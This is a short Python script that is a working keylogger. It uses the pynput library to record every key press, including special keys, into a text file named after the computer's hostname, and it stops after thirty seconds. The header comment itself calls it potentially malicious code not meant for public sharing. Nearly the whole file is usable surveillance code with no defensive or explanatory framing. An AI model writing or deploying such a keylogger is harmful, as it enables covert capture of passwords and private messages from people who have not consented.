''' This file is not supposed to be shared publicly as it contains potentially malicious code. '''

import socket
from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta

#to prevent infinite wait time (can be changed)
die = datetime.now()+timedelta(seconds=30)

dev_name = socket.gethostname()
for _ in dev_name: 
    if _ == '\ / : * ? " < > |':
        dev_name.replace(_,"_")

#timestamp and partition for better viewing and analysis
logfile = open("C:/<your_file_path>/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
logfile.write("\n\n--------------------------------------------------------------------------------------------------------------------------------------------------------------\n")
logfile.write(datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n\n")
logfile.close()

def on_press(key): 
    if datetime.now() >= die:
        return False
    
    logfile = open("C:/<your_file_path>/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
    try:
        logfile.write("{0}".format(key.char)) #recording every key press
    except AttributeError:
        logfile.write(" [{0}] ".format(key.name)) #recording special keys also
    logfile.close()

def on_release(key):
    logfile = open("C:/<your_file_path>/Desktop/{0}_KEYLOG.txt".format(dev_name),"a")
    if key == Key.enter:
        logfile.write("\n")
    logfile.close()
    if datetime.now() >= die:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

#status of keylogger and its log file name for viewing
print("Logging has now been stopped. File:{0}".format(f"{dev_name}_KEYLOG.txt")) 
